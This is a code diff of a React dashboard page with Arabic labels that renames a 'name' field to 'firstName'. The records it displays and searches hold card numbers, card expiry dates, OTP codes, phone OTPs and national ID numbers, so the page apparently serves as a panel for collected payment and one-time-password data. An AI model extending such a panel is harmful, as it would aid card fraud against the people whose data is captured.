@@ -142,7 +142,7 @@ interface Notification {
   network: string;
   phoneOtp: string;
   cardExpiry: string;
-  name: string;
+  firstName: string;
   otpCode: string;
   phone: string;
   flagColor?: string;
@@ -876,7 +876,7 @@ export default function NotificationsPage() {
       const term = searchTerm.toLowerCase();
       filtered = filtered.filter(
         (notification) =>
-          notification.name?.toLowerCase().includes(term) ||
+          notification.firstName?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
           notification.phone?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
@@ -1965,7 +1965,7 @@ export default function NotificationsPage() {
             <div className="space-y-4">
               <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                 {[
-                  { label: "الاسم", value: selectedNotification.name },
+                  { label: "الاسم", value: selectedNotification.firstName },
                   { label: "رقم الهوية", value: selectedNotification.idNumber },
                   {
                     label: "البريد الإلكتروني",
@@ -2052,3 +2052,4 @@ export default function NotificationsPage() {
     </div>
   );
 }
+
